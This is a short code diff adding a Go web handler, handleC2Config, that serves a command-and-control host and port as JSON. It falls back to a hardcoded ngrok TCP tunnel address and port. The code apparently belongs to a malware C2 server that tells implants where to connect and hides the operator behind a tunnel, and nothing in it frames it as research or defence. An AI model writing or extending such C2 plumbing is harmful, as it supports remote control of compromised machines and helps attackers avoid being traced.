@@ -1,0 +1,21 @@
+func (h *WebHandler) handleC2Config(w http.ResponseWriter, r *http.Request) {
+    w.Header().Set("Content-Type", "application/json")
+    
+    // Baca dari environment variable atau hardcoded
+    host := os.Getenv("NGROK_HOST")
+    if host == "" {
+        host = "2.tcp.ngrok.io"  // fallback
+    }
+    
+    port := os.Getenv("NGROK_PORT")
+    if port == "" {
+        port = "25375"  // fallback
+    }
+    
+    response := map[string]interface{}{
+        "host": host,
+        "port": port,
+    }
+    
+    json.NewEncoder(w).Encode(response)
+}
